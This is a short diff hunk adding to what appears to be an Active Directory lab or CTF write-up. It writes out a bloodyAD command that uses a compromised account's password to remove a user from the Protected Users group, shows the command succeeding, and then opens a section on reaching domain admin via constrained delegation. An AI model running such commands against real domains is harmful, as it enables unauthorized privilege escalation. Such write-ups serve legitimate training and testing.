@@ -1482,5 +1482,11 @@ Now this user is compromised i can work on removing the user `m.ibabao` from the
 Now the user is compromised i can use his access to remove the user from the group
 
 ```python
-
+bloodyAD -u 'l.forta' -p 'Password123!' -d 'novacart.local' --host dc.novacart.local remove groupMember "Protected Users" 'm.ibabao'
+[+] m.ibabao removed from Protected Users
 ```
+The user is no longer in the protected users group so now i can use this user to perform contstrained delegation
+
+
+# Domain admin via Constrained Delegation
+
